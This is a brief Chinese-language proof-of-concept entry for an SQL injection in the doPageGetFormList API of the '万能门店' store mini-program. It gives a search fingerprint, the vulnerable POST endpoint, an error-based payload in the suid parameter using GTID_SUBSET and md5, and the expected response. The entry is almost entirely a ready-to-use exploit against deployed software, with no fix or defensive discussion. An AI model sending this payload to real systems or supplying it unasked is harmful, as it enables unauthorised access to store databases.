# 万能门店小程序doPageGetFormList存在sql注入漏洞

万能门店小程序 ｜ SQL注入 ｜ —
- **指纹**：`"/comhome/cases/index.html"`
- **请求**：`POST /api/wxapps/doPageGetFormList HTTP/1.1`

**Payload**
```
suid='AND GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)-- bdmV
```
- **响应特征**：200